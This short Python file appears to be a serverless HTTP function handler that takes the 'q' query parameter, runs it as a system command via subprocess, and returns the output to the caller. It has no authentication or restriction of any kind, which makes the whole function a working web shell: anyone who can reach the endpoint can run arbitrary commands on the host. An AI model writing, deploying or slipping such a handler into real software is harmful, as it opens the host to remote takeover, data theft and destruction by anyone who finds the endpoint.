import subprocess


def main(ctx):
    cmd = ctx.req.query.get("q")
    if cmd:
        shell = subprocess.run(
            cmd.split(),
            check=True,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        return ctx.res.send(shell.stdout, 200, {"content-type": "text/plain"})
    return ctx.res.send("No command")
